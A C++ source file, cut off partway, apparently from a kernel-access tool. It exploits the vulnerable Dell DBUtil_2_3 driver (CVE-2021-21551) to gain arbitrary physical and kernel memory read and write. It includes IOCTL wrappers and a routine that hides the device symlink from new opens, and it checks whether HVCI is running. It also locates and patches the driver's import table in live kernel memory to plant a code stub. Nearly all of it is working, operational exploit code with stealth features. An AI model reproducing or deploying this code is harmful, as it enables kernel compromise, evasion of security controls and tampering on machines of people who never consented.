#include "r0.hpp"
#include <windows.h>
#include <winternl.h>
#include "vmm.hpp"          // phys_is_ram guard for the MmMapIoSpace path
#include "cloak.hpp"        // loader-list locator, primary driver-base source
#include <cstring>
#include <cstdio>
#include <string>
#include <vector>

namespace r0 {

// DBUtil_2_3 (Dell BIOS flash utility driver, CVE-2021-21551).
//
// The IOCTL codes and request layouts below were read out of the shipped
// driver image by disassembling its IRP dispatch, not guessed.
//
//   0x9B0C1F40  physical read    { u64 hdr; u64 pa; u8 payload[]; }  0x10 + n
//   0x9B0C1F44  physical write   { u64 hdr; u64 pa; u8 payload[]; }  0x10 + n
//   0x9B0C1EC4  kernel-VA read   { u64 hdr; u64 va; u64 off; u8 p[]; } 0x18 + n
//   0x9B0C1EC8  kernel-VA write  { u64 hdr; u64 va; u64 off; u8 p[]; } 0x18 + n
//
// The physical pair maps with MmMapIoSpace; the kernel-VA pair memmoves in the
// caller's thread context.
namespace {

constexpr DWORD kPhysRead  = 0x9B0C1F40;
constexpr DWORD kPhysWrite = 0x9B0C1F44;
constexpr DWORD kKernWrite = 0x9B0C1EC8;
constexpr DWORD kKernRead  = 0x9B0C1EC4;

constexpr size_t kPhysHdr = 0x10;          // { u64 hdr; u64 pa }
constexpr size_t kKernHdr = 0x18;          // { u64 hdr; u64 va; u64 off }

HANDLE g_dev = INVALID_HANDLE_VALUE;
bool   g_vread_ok = false;

int try_vread(uint64_t va, size_t len, bool payload, bool& zero_back) {
    zero_back = false;
    std::vector<uint8_t> in(kKernHdr + (payload ? len : 0), 0);
    memcpy(in.data() + 0x08, &va, 8);

    std::vector<uint8_t> out(kKernHdr + len, 0xCC);
    DWORD got = 0;
    if (!DeviceIoControl(g_dev, kKernRead, in.data(), (DWORD)in.size(),
                         out.data(), (DWORD)out.size(), &got, nullptr))
        return -1;

    static const uint8_t mz[2] = { 'M', 'Z' };
    if (len >= 2) {
        if (memcmp(out.data() + kKernHdr, mz, 2) == 0) return 1;
        if (memcmp(out.data(), mz, 2) == 0) return 1;
    }

    if (payload) {
        bool z = true;
        for (size_t i = 0; i < len; ++i) if (out[kKernHdr + i]) { z = false; break; }
        zero_back = z;
    }
    return 0;
}

bool open_dev() {
    g_dev = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                        OPEN_EXISTING, 0, nullptr);
    if (g_dev != INVALID_HANDLE_VALUE) return true;

    // With the symlink hidden \\.\DBUtil_2_3 no longer resolves. Open the
    // device object directly in the NT namespace instead.
    const wchar_t* p = L"\\Device\\DBUtil_2_3";
    UNICODE_STRING un{};
    un.Buffer = const_cast<PWSTR>(p);
    un.Length = un.MaximumLength = (USHORT)(wcslen(p) * sizeof(wchar_t));
    OBJECT_ATTRIBUTES oa{};
    InitializeObjectAttributes(&oa, &un, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
    IO_STATUS_BLOCK iosb{};
    using Fn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
                                PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
    const auto nt = reinterpret_cast<Fn>(
        reinterpret_cast<void*>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateFile")));
    if (!nt) return false;
    HANDLE h = nullptr;
    if (nt(&h, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &oa, &iosb, nullptr, 0,
           FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, 0, nullptr, 0) < 0) return false;
    g_dev = h;
    return true;
}

void close_dev() {
    if (g_dev != INVALID_HANDLE_VALUE) { CloseHandle(g_dev); g_dev = INVALID_HANDLE_VALUE; }
}

bool do_read(uint64_t pa, void* out, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
    std::vector<uint8_t> buf(kPhysHdr + len, 0);
    memcpy(buf.data() + 0x08, &pa, 8);
    DWORD got = 0;
    if (!DeviceIoControl(g_dev, kPhysRead, buf.data(), (DWORD)buf.size(),
                         buf.data(), (DWORD)buf.size(), &got, nullptr))
        return false;
    memcpy(out, buf.data() + kPhysHdr, len);
    return true;
}

bool do_write(uint64_t pa, const void* in, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
    std::vector<uint8_t> buf(kPhysHdr + len, 0);
    memcpy(buf.data() + 0x08, &pa, 8);
    memcpy(buf.data() + kPhysHdr, in, len);
    DWORD got = 0;
    return DeviceIoControl(g_dev, kPhysWrite, buf.data(), (DWORD)buf.size(),
                           buf.data(), (DWORD)buf.size(), &got, nullptr) != 0;
}

bool do_vread(uint64_t va, void* out, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
    if (va < 0xFFFF800000000000ull) return false;
    std::vector<uint8_t> buf(kKernHdr + len, 0);
    memcpy(buf.data() + 0x08, &va, 8);
    const uint64_t off = 0;
    memcpy(buf.data() + 0x10, &off, 8);
    DWORD got = 0;
    if (!DeviceIoControl(g_dev, kKernRead, buf.data(), (DWORD)buf.size(),
                         buf.data(), (DWORD)buf.size(), &got, nullptr))
        return false;
    memcpy(out, buf.data() + kKernHdr, len);
    return true;
}

bool do_vwrite(uint64_t va, const void* in, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
    if (va < 0xFFFF800000000000ull) return false;
    std::vector<uint8_t> buf(kKernHdr + len, 0);
    memcpy(buf.data() + 0x08, &va, 8);
    const uint64_t off = 0;
    memcpy(buf.data() + 0x10, &off, 8);
    memcpy(buf.data() + kKernHdr, in, len);
    DWORD got = 0;
    return DeviceIoControl(g_dev, kKernWrite, buf.data(), (DWORD)buf.size(),
                           buf.data(), (DWORD)buf.size(), &got, nullptr) != 0;
}

Backend g_be_local{L"\\\\.\\DBUtil_2_3", open_dev, close_dev,
                   do_read, do_write, do_vwrite, do_vread};
const Backend* g_be = nullptr;

} // anonymous namespace

bool g_write_ok = false;

// ---------------------------------------------------------------------------
// Direction probe for the kernel-VA pair. A transposed pair would memmove
// zeroes over ntoskrnl's header, so the direction is proven before use.
// Stage A carries the header only (harmless under either reading).
// ---------------------------------------------------------------------------
bool vread_probe(uint64_t va, size_t len) {
    if (g_vread_ok) return true;
    if (g_dev == INVALID_HANDLE_VALUE || !len || len > 64) return false;
    if (va < 0xFFFF800000000000ull) return false;

    bool zb = false;
    if (try_vread(va, len, false, zb) == 1) { g_vread_ok = true; return true; }
    if (try_vread(va, len, true, zb) == 1) { g_vread_ok = true; return true; }

    if (zb) {
        vmm::g_ntos_mz_broken = true;
        printf("[!] kernel-VA pair is TRANSPOSED: 0x%08X behaves as a write. "
               "ntoskrnl+0 now holds 00 00; header paths are degraded for this "
               "boot.\n", (unsigned)kKernRead);
    }
    return false;
}

bool vread_ready() { return g_vread_ok; }

static bool fail(const char* why) {
    printf("[r0] init FAIL: %s\n", why);
    return false;
}

bool phys_read_raw(uint64_t pa, void* buf, size_t len);

bool init() {
    if (g_be) return true;
    if (!open_dev()) return fail("no device handle");

    // 1. IOCTL ciftinin yonu. Basligi degil, davranisi kanitla.
    uint8_t a[16] = {}, b[16] = {};
    if (!phys_read_raw(0x0, a, sizeof a))
        return fail("phys read at 0x0 failed - write path is being used?");
    bool nz = false;
    for (size_t i = 0; i < sizeof a; ++i) nz |= (a[i] != 0);
    if (!nz)
        return fail("read of 0x0 returned zeros - 0x9B0C1F40/44 transposed");
    if (!phys_read_raw(0x0, b, sizeof b))
        return fail("second read at 0x0 failed");
    if (memcmp(a, b, sizeof a) != 0)
        return fail("read path unstable - two reads of 0x0 differ");
    printf("[r0] direction proven: 0x9B0C1F40=read 0x9B0C1F44=write\n");

    // 2. Yazma yolu, okuma yolu kanitlanana kadar kapali.
    g_write_ok = false;
    g_be = &g_be_local;
    return true;
}

// kwtest: yazma yonunu kanitlayan tek sey. Ayni 8 byte'i geri yazar.
bool kwtest(uint64_t sys_eproc) {
    if (!sys_eproc) return false;
    uint64_t v = 0;
    if (!vmm::kread_trusted(sys_eproc, &v, sizeof v)) return false;
    if (!vmm::kwrite_trusted(sys_eproc, &v, sizeof v)) return false;
    uint64_t back = 0;
    if (!vmm::kread_trusted(sys_eproc, &back, sizeof back)) return false;
    if (back != v) return false;
    g_write_ok = true;
    printf("[r0] write path proven\n");
    return true;
}

void shutdown() {
    if (g_be) { g_be->close(); g_be = nullptr; }
}

bool alive() { return g_be != nullptr; }
void set_backend(const Backend* be) { g_be = be; }

// Physical reads go ONLY through the driver's MmMapIoSpace IOCTL: it refuses
// unmappable ranges with a NULL mapping instead of faulting, so a wrong
// address costs a failed read, never a bugcheck. The RAM guard keeps the walk
// out of MMIO holes.
bool pread(uint64_t pa, void* buf, size_t len) {
    if (!g_be) return false;
    if (!len) return true;
    if (!vmm::phys_is_ram(pa, len)) return false;
    return g_be->read(pa, buf, len);
}

bool pwrite(uint64_t pa, const void* buf, size_t len) {
    if (!g_be) return false;
    if (!len) return true;
    if (!vmm::phys_is_ram(pa, len)) return false;
    return g_be->write(pa, buf, len);
}

// phys_read_raw: physical read that bypasses the phys_is_ram guard, so a
// hole address can still be observed. Used only for the P1 direction oracle
// at physical 0x0 (IVT, unused after boot - safe to read).
bool phys_read_raw(uint64_t pa, void* buf, size_t len) {
    if (!len) return true;
    return do_read(pa, buf, len);
}

bool vwrite(uint64_t va, const void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->vwrite(va, buf, len);
}

bool vread(uint64_t va, void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->vread(va, buf, len);
}

// ---------------------------------------------------------------------------
// \??\DBUtil_2_3 removal.
//
// IoCreateSymbolicLink creates the link as a permanent object, so the way to
// remove the name is: open the link with DELETE, NtMakeTemporaryObject clears
// OBJ_PERMANENT, close - the directory entry goes away. The device object is
// not touched, so our open handle keeps working and only new opens by path
// fail. Permanent for the boot.
// ---------------------------------------------------------------------------
using NtOpenSymbolicLinkObjectFn = NTSTATUS (NTAPI*)(HANDLE*, ACCESS_MASK, PUNICODE_STRING);
using NtMakeTemporaryObjectFn    = NTSTATUS (NTAPI*)(HANDLE);

bool hide_symlink(const wchar_t* link) {
    if (!link || !*link) return false;

    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    if (!nt) return false;
    const auto nt_open = reinterpret_cast<NtOpenSymbolicLinkObjectFn>(
        reinterpret_cast<void*>(GetProcAddress(nt, "NtOpenSymbolicLinkObject")));
    const auto nt_temp = reinterpret_cast<NtMakeTemporaryObjectFn>(
        reinterpret_cast<void*>(GetProcAddress(nt, "NtMakeTemporaryObject")));
    if (!nt_open || !nt_temp) {
        printf("[!] ntdll is missing NtOpenSymbolicLinkObject / NtMakeTemporaryObject\n");
        return false;
    }

    UNICODE_STRING name{};
    name.Buffer = const_cast<PWSTR>(link);
    name.Length = static_cast<USHORT>(wcslen(link) * sizeof(wchar_t));
    name.MaximumLength = name.Length;

    HANDLE h = nullptr;
    NTSTATUS st = nt_open(&h, DELETE, &name);
    if (st < 0) {
        printf("[!] open %ls failed: 0x%08lX - DELETE access refused?\n",
               link, static_cast<unsigned long>(st));
        return false;
    }

    st = nt_temp(h);
    CloseHandle(h);
    if (st < 0) {
        printf("[!] NtMakeTemporaryObject failed: 0x%08lX\n", static_cast<unsigned long>(st));
        return false;
    }

    // Prove the name is gone: only not-found counts as success.
    HANDLE probe = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                               OPEN_EXISTING, 0, nullptr);
    if (probe != INVALID_HANDLE_VALUE) {
        CloseHandle(probe);
        printf("[!] \\\\.\\DBUtil_2_3 still opens - the link was not removed\n");
        return false;
    }
    const DWORD err = GetLastError();
    if (err != ERROR_FILE_NOT_FOUND && err != ERROR_PATH_NOT_FOUND) {
        printf("[!] \\\\.\\DBUtil_2_3 still resolves (error %lu) - link not removed\n", err);
        return false;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Cached physical mapping patch (--dpatch).
//
// The shipped driver calls MmMapIoSpace(pa, len, MmNonCached). On build 26200
// MiFillSystemPtes refuses MmNonCached mappings of any page whose PFN is owned
// as a page table and returns STATUS_CONFLICTING_ADDRESSES, so every PML4 /
// PDPTE / PDE / PTE read dies while ordinary data RAM reads fine.
//
// The fix is applied through the PHYSICAL write path (never vwrite): image
// pages are read-only, and a kernel-VA memmove into them bugchecks. Import
// descriptors and name thunks are walked in the on-disk image (this image
// discards INIT at runtime); only the validated, resident IAT slot is read
// from kernel memory. An int3 run outside the .pdata section receives the
// stub; unwind metadata is not rewritten or treated as a safety guarantee:
//
//   41 b8 01 00 00 00   mov  $1,%r8d        ; CacheType = MmCached
//   e9 <rel32>          jmp  real           ; 11-byte form when in range
//   48 b8 <real> / ff e0                    ; 18-byte movabs fallback
//
// Every structure is validated before writing, both target pages must be
// present through the runtime PTE self-map, and the write is verified with a
// cached read-back. Memory-only: re-run --dpatch after every boot, BEFORE
// --cloak. --dpatch-dry performs every validation and prints the plan without
// writing; --dpatch-step stub|import splits the two writes.
// ---------------------------------------------------------------------------
namespace {

using NtQuerySystemInformationFn = NTSTATUS (NTAPI*)(ULONG, PVOID, ULONG, PULONG);

NtQuerySystemInformationFn get_qsi() {
    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    if (!nt) return nullptr;
    return reinterpret_cast<NtQuerySystemInformationFn>(
        reinterpret_cast<void*>(GetProcAddress(nt, "NtQuerySystemInformation")));
}

bool hvci_running() {
    const auto qs = get_qsi();
    if (!qs) return true;
    struct { ULONG length; ULONG options; } ci{ 8, 0 };
    ULONG ret = 0;
    // SystemCodeIntegrityInformation = 103; option bit 0x2 = HVCI enabled.
    if (qs(103, &ci, sizeof(ci), &ret) < 0) return true;
    return (ci.options & 0x2) != 0;
}

// Fallback locator: SystemModuleInformation. Byte-stride walk (SYSTEM_MODULE
// is 296 bytes with ModuleName at +0x28, and ImageSize is 32-bit at +0x18).
bool find_driver_base(uint64_t& base, uint32_t& size) {
    const auto qs = get_qsi();
    if (!qs) return false;

    std::vector<uint8_t> buf;
    ULONG got = 0;
    bool have = false;
    for (int attempt = 0; attempt < 4; ++attempt) {
        ULONG need = 0;
        qs(11, nullptr, 0, &need);
        if (!need || need > (1u << 24)) return false;
        need += 0x1000 * static_cast<ULONG>(attempt + 1);
        buf.assign(need, 0);
        got = need;
        const LONG st = qs(11, buf.data(), need, &got);
        if (st == 0) { have = true; break; }
        if (static_cast<ULONG>(st) != 0xC0000004ul) return false;
    }
    if (!have || buf.size() < 8) return false;

    const uint32_t count = *reinterpret_cast<uint32_t*>(buf.data());
    if (!count || count > 4096) return false;
    size_t stride = (got - 8) / count;
    if (stride < 0x128) stride = 0x128;

    for (uint32_t i = 0; i < count; ++i) {
        const size_t off = 8 + static_cast<size_t>(i) * stride;
        if (off + 0x128 > buf.size()) break;
        const char* nm = reinterpret_cast<const char*>(&buf[off + 0x28]);
        char lower[257]{};
        const size_t n = strnlen(nm, 256);
        for (size_t k = 0; k < n && k < 256; ++k)
            lower[k] = (nm[k] >= 'A' && nm[k] <= 'Z') ? static_cast<char>(nm[k] + 32) : nm[k];
        lower[n < 256 ? n : 256] = 0;

        // Match the image name cloak was configured with (--driver-name /
        // FORTESP_DRIVER_IMAGE / FORTESP_IMAGE), not a hardcoded string: the
        // loader and the cloak must agree on the same image.
        const char* want = cloak::driver_image();
        const char* leaf = want;
        for (const char* p = want; *p; ++p)
            if (*p == '\\' || *p == '/') leaf = p + 1;
        char lwant[128]{};
        for (size_t k = 0; leaf[k] && k < sizeof(lwant) - 1; ++k)
            lwant[k] = (leaf[k] >= 'A' && leaf[k] <= 'Z')
                     ? static_cast<char>(leaf[k] + 32) : leaf[k];
        const size_t lower_len = strlen(lower);
        const size_t want_len = strlen(lwant);
        if (!want_len || lower_len < want_len) continue;
        const char* tail = lower + lower_len - want_len;
        if (strcmp(tail, lwant) != 0 ||
            (tail != lower && tail[-1] != '\\' && tail[-1] != '/')) continue;
        uint64_t ib{}; uint32_t isz{};
        memcpy(&ib, &buf[off + 0x10], 8);
        memcpy(&isz, &buf[off + 0x18], 4);
        if (ib < 0xFFFF000000000000ull || !isz) continue;
        base = ib; size = isz;
        return true;
    }
    return false;
}

// ---------------------------------------------------------------------------
// Driver image parsing. Every read below is from the driver's mapped image
// (present, non-paged), so r0::vread is safe. The old code trusted RVAs taken
// from a disassembly; these helpers walk the PE structures instead.
// ---------------------------------------------------------------------------
struct DrvSection {
    uint32_t va{}, vsize{}, rawsize{}, chars{};
    bool pdata{};
};

struct DrvPe {
    IMAGE_DOS_HEADER dos{};
    IMAGE_NT_HEADERS64 nt{};
    std::vector<DrvSection> secs;
    uint32_t size{};
};

bool read_drv_pages(uint64_t va, void* out, size_t len) {
    for (size_t i = 0; i < len;) {
        uint64_t pa = 0;
        if (!vmm::safe_translate(va + i, pa)) return false;
        size_t n = 0x1000 - ((va + i) & 0xFFF);
        if (n > len - i) n = len - i;
        i += n;
    }
    return vread(va, out, len);
}

bool read_drv_pe(uint64_t base, DrvPe& pe) {
    if (!read_drv_pages(base, &pe.dos, sizeof(pe.dos))) return false;
    if (pe.dos.e_magic != 0x5A4D) return false;
    if (pe.dos.e_lfanew < 0x40 || pe.dos.e_lfanew > 0x1000) return false;
    if (!read_drv_pages(base + pe.dos.e_lfanew, &pe.nt, sizeof(pe.nt))) return false;
    if (pe.nt.Signature != 0x4550) return false;
    if (pe.nt.OptionalHeader.Magic != 0x20B) return false;

    const uint32_t img = pe.nt.OptionalHeader.SizeOfImage;
    if (img < 0x1000 || img > (1u << 26)) return false;
    pe.size = img;

    const uint16_t n = pe.nt.FileHeader.NumberOfSections;
    const uint16_t opt = pe.nt.FileHeader.SizeOfOptionalHeader;
    if (!n || n > 96 || opt < 0x40 || opt > 0x400) return false;

    const uint64_t off = base + pe.dos.e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + opt;
    std::vector<IMAGE_SECTION_HEADER> raw(n);
    if (!read_drv_pages(off, raw.data(), raw.size() * sizeof(IMAGE_SECTION_HEADER))) return false;

    pe.secs.clear();
    for (const auto& s : raw) {
        if (!s.Misc.VirtualSize) continue;
        if (s.VirtualAddress >= pe.size) continue;
        pe.secs.push_back(DrvSection{ s.VirtualAddress, s.Misc.VirtualSize,
                                      s.SizeOfRawData, s.Characteristics,
                                      memcmp(s.Name, ".pdata", 6) == 0 });
    }
    return !pe.secs.empty();
}

// Sections the loader keeps resident after DriverEntry: INIT is discardable
// and PAGE is pageable, so neither may be read at runtime. This driver keeps
// its import descriptors and hint/name strings in INIT, which is why walking
// IMAGE_DIRECTORY_ENTRY_IMPORT later is not safe. The IAT itself lives in a
// resident, readable, non-executable section (.rdata).
bool sec_resident(const DrvSection& s) {
    if (!(s.chars & IMAGE_SCN_MEM_READ)) return false;
    if (s.chars & IMAGE_SCN_MEM_DISCARDABLE) return false;
    return true; // NOT_PAGED is only a hint; G1 proves the live PTE is present.
}

bool sec_code_resident(const DrvSection& s) {
    return sec_resident(s) && (s.chars & IMAGE_SCN_MEM_EXECUTE) &&
           !(s.chars & IMAGE_SCN_MEM_WRITE) && !s.pdata;
}

const DrvSection* sec_for_rva(const DrvPe& pe, uint32_t rva, uint32_t len) {
    for (const auto& s : pe.secs) {
        uint32_t sz = 0;
        if (rva < s.va || rva >= pe.size || len > pe.size - rva) continue;
        sz = s.vsize > s.rawsize ? s.vsize : s.rawsize;
        if (rva - s.va <= sz && len <= sz - (rva - s.va)) return &s;
    }
    return nullptr;
}

bool sec_span(const DrvPe& pe, const DrvSection& s, uint32_t& sz) {
    if (s.va >= pe.size) return false;
    sz = s.vsize > s.rawsize ? s.vsize : s.rawsize;
    const uint32_t room = pe.size - s.va;
    if (sz > room) sz = room;
    return sz != 0;
}

// Walk the on-disk import descriptors: INIT is discardable in the loaded
// image, so a runtime directory walk would dereference unmapped memory.
bool find_iat_slot(uint64_t base, const DrvPe& pe, uint64_t real_map,
                   uint64_t patched_to, uint64_t& slot, uint32_t& slot_rva,
                   bool& already_patched) {
    const char* image = cloak::driver_image();
    if (!image || !*image) return false;
    const int wn = MultiByteToWideChar(CP_UTF8, 0, image, -1, nullptr, 0);
    if (wn <= 1 || wn > MAX_PATH) return false;
    std::wstring wide(static_cast<size_t>(wn), L'\0');
    if (!MultiByteToWideChar(CP_UTF8, 0, image, -1, wide.data(), wn)) return false;
    wide.pop_back();
    std::wstring path;
    if (strchr(image, '\\') || strchr(image, '/')) {
        path = wide;
    } else {
        wchar_t sysdir[MAX_PATH]{};
        const UINT sn = GetSystemDirectoryW(sysdir, MAX_PATH);
        if (!sn || sn >= MAX_PATH) return false;
        path = sysdir;
        path += L"\\drivers\\";
        path += wide;
    }
    if (path.size() >= MAX_PATH) return false;

    HANDLE f = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE) {
        printf("[!] cannot open the driver image for import walking (error %lu)\n",
               GetLastError());
        return false;
    }
    LARGE_INTEGER fs{};
    if (!GetFileSizeEx(f, &fs) || fs.QuadPart < 0x400 || fs.QuadPart > (64LL << 20)) {
        CloseHandle(f);
        return false;
    }
    std::vector<uint8_t> file(static_cast<size_t>(fs.QuadPart));
    DWORD got = 0;
    const BOOL read_ok = ReadFile(f, file.data(), static_cast<DWORD>(file.size()), &got, nullptr);
    CloseHandle(f);
    if (!read_ok || got != file.size()) return false;

    IMAGE_DOS_HEADER dos{};
    memcpy(&dos, file.data(), sizeof(dos));
    if (dos.e_magic != 0x5A4D || dos.e_lfanew < 0x40) return false;
    const size_t ntoff = static_cast<size_t>(dos.e_lfanew);
    IMAGE_NT_HEADERS64 nt{};
    if (ntoff > file.size() || file.size() - ntoff < sizeof(nt)) return false;
    memcpy(&nt, file.data() + ntoff, sizeof(nt));
    if (nt.Signature != 0x4550 || nt.OptionalHeader.Magic != 0x20B ||
        nt.FileHeader.TimeDateStamp != pe.nt.FileHeader.TimeDateStamp ||
        nt.OptionalHeader.SizeOfImage != pe.size ||
        nt.OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_IMPORT) {
        printf("[!] on-disk and loaded driver images do not match\n");
        return false;
    }

    const uint16_t nsec = nt.FileHeader.NumberOfSections;
    if (!nsec || nsec > 96) return false;
    const size_t secoff = ntoff + 4 + sizeof(IMAGE_FILE_HEADER) +
                          nt.FileHeader.SizeOfOptionalHeader;
    if (secoff > file.size() || file.size() - secoff < nsec * sizeof(IMAGE_SECTION_HEADER))
        return false;
    std::vector<IMAGE_SECTION_HEADER> secs(nsec);
    memcpy(secs.data(), file.data() + secoff, nsec * sizeof(IMAGE_SECTION_HEADER));

    auto file_range = [&](uint64_t rva, size_t len, size_t& off) -> bool {
        if (rva >= pe.size || len > pe.size - rva) return false;
        if (rva < nt.OptionalHeader.SizeOfHeaders) {
            if (rva > file.size() || len > file.size() - rva) return false;
            off = static_cast<size_t>(rva);
            return true;
        }
        for (const auto& s : secs) {
            if (rva < s.VirtualAddress) continue;
            const uint64_t delta = rva - s.VirtualAddress;
            if (delta > s.SizeOfRawData || len > s.SizeOfRawData - delta) continue;
            const uint64_t fo = static_cast<uint64_t>(s.PointerToRawData) + delta;
            if (fo > file.size() || len > file.size() - fo) continue;
            off = static_cast<size_t>(fo);
            return true;
        }
        return false;
    };

    auto name_eq = [&](uint64_t rva, const char* want, bool fold) -> bool {
        for (size_t i = 0; i < 260; ++i) {
            size_t off = 0;
            if (!file_range(rva + i, 1, off)) return false;
            unsigned char c = file[off];
            unsigned char w = static_cast<unsigned char>(want[i]);
            if (fold) {
                if (c >= 'A' && c <= 'Z') c += 'a' - 'A';
                if (w >= 'A' && w <= 'Z') w += 'a' - 'A';
            }
            if (c != w) return false;
            if (!c) return true;
        }
        return false;
    };

    const auto& dir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!dir.VirtualAddress || dir.Size < sizeof(IMAGE_IMPORT_DESCRIPTOR) ||
        dir.VirtualAddress >= pe.size) return false;

    int hits = 0;
    uint32_t hit_rva = 0;
    for (uint32_t i = 0; i < 2048 &&
         i * sizeof(IMAGE_IMPORT_DESCRIPTOR) <= dir.Size - sizeof(IMAGE_IMPORT_DESCRIPTOR); ++i) {
        const uint64_t drva = static_cast<uint64_t>(dir.VirtualAddress) +
                              i * sizeof(IMAGE_IMPORT_DESCRIPTOR);
        size_t off = 0;
        if (!file_range(drva, sizeof(IMAGE_IMPORT_DESCRIPTOR), off)) return false;
        IMAGE_IMPORT_DESCRIPTOR d{};
        memcpy(&d, file.data() + off, sizeof(d));
        const uint8_t zero[sizeof(d)]{};
        if (memcmp(&d, zero, sizeof(d)) == 0) break;
        if (!d.Name || !d.FirstThunk || !name_eq(d.Name, "ntoskrnl.exe", true)) continue;

        const uint32_t lookup = d.OriginalFirstThunk ? d.OriginalFirstThunk : d.FirstThunk;
        for (uint32_t j = 0; j < 32768; ++j) {
            size_t toff = 0;
            if (!file_range(static_cast<uint64_t>(lookup) + j * 8ull, 8, toff)) return false;
            uint64_t thunk = 0;
            memcpy(&thunk, file.data() + toff, 8);
            if (!thunk) break;
            if (thunk & IMAGE_ORDINAL_FLAG64) continue;
            if (thunk > 0xFFFFFFFFull ||
                !name_eq(static_cast<uint32_t>(thunk) + 2ull, "MmMapIoSpace", false))
                continue;
            const uint64_t candidate_rva = static_cast<uint64_t>(d.FirstThunk) + j * 8ull;
            if (candidate_rva > 0xFFFFFFFFull) return false;
            hit_rva = static_cast<uint32_t>(candidate_rva);
            ++hits;
        }
    }
    if (hits != 1) {
        printf("[!] import walk found %d MmMapIoSpace thunk(s), expected one\n", hits);
        return false;
    }

    const DrvSection* ss = sec_for_rva(pe, hit_rva, 8);
    if (!ss || !sec_resident(*ss) || (ss->chars & IMAGE_SCN_MEM_EXECUTE) ||
        (ss->chars & IMAGE_SCN_MEM_WRITE)) {
        printf("[!] IAT rva 0x%x is not in a resident, non-executable RO section\n", hit_rva);
        return false;
    }
    if (vmm::g_ntos_size < 16 || real_map < vmm::g_ntos ||
        real_map - vmm::g_ntos > vmm::g_ntos_size - 16) return false;
    if (patched_to) {
        if (patched_to < base || patched_to - base >= pe.size) return false;
        const DrvSection* ps = sec_for_rva(pe, static_cast<uint32_t>(patched_to - base), 11);
        if (!ps || !sec_code_resident(*ps)) return false;
    }

    uint64_t imp = 0;
    const uint64_t candidate = base + hit_rva;
    if (!read_drv_pages(candidate, &imp, 8)) return false;
    if (imp != real_map && (!patched_to || imp != patched_to)) {
        printf("[!] descriptor IAT value 0x%llx is outside the accepted set "
               "{MmMapIoSpace 0x%llx, stub 0x%llx}\n",
               (unsigned long long)imp, (unsigned long long)real_map,
               (unsigned long long)patched_to);
        return false;
    }

    slot = candidate;
    slot_rva = hit_rva;
    already_patched = patched_to && imp == patched_to;
    printf("[+] import descriptor: ntoskrnl.exe!MmMapIoSpace -> IAT rva 0x%x "
           "(section rva 0x%x, characteristics 0x%lx)\n",
           slot_rva, ss->va, (unsigned long)ss->chars);
    return true;
}

struct StubSite {
    uint64_t va{};
    uint32_t rva{};
    size_t   room{};
};

// Find a stub this tool already planted (idempotency after a partial run).
bool find_existing_stub(uint64_t base, const DrvPe& pe, uint64_t real_map, StubSite& site) {
    constexpr size_t kChunk = 0x10000;
    std::vector<uint8_t> buf(kChunk + 0x40);
    for (const auto& s : pe.secs) {
        if (!sec_code_resident(s)) continue;
        uint32_t sz = 0;
        if (!sec_span(pe, s, sz)) continue;
        for (uint32_t off = 0; off < sz; off += kChunk) {
            size_t n = sz - off;
            if (n > kChunk) n = kChunk;
            if (n + 0x40 <= sz - off) n += 0x40;   // overlap for split stubs
            if (!read_drv_pages(base + s.va + off, buf.data(), n)) break;

            for (size_t i = 0; i + 11 <= n; ++i) {
                const bool rel = buf[i] == 0x41 && buf[i + 1] == 0xB8 &&
                                 buf[i + 2] == 1 && buf[i + 3] == 0 &&
                                 buf[i + 4] == 0 && buf[i + 5] == 0 && buf[i + 6] == 0xE9;
                if (rel) {
                    int32_t d{};
                    memcpy(&d, buf.data() + i + 7, 4);
                    const uint64_t dst = base + s.va + off + i + 11 + static_cast<int64_t>(d);
                    if (dst == real_map) {
                        site.va = base + s.va + off + i;
                        site.rva = s.va + off + static_cast<uint32_t>(i);
                        site.room = 11;
                        return true;
                    }
                }
                if (i + 18 <= n && buf[i] == 0x41 && buf[i + 1] == 0xB8 &&
                    buf[i + 2] == 1 && buf[i + 3] == 0 && buf[i + 4] == 0 &&
                    buf[i + 5] == 0 && buf[i + 6] == 0x48 && buf[i + 7] == 0xB8) {
                    uint64_t dst{};
                    memcpy(&dst, buf.data() + i + 8, 8);
                    if (dst == real_map && buf[i + 16] == 0xFF && buf[i + 17] == 0xE0) {
                        site.va = base + s.va + off + i;
                        site.rva = s.va + off + static_cast<uint32_t>(i);
                        site.room = 18;
                        return true;
                    }
                }
            }
        }
    }
    return false;
}

// Locate an uninterrupted 0xCC run of at least `need` bytes inside a read-only
// executable section other than the .pdata section, wholly within one page.
// This does not rewrite unwind metadata; the highest RVA wins because padding
// lives at the section tail.
bool find_cc_run(uint64_t base, const DrvPe& pe, size_t need, StubSite& best) {
    constexpr size_t kChunk = 0x10000;
    std::vector<uint8_t> buf(kChunk + 0x40);
    bool have = false;

    for (const auto& s : pe.secs) {
        if (!sec_code_resident(s)) continue;
        uint32_t sz = 0;
        if (!sec_span(pe, s, sz)) continue;

        for (uint32_t off = 0; off < sz; off += kChunk) {
            size_t n = sz - off;
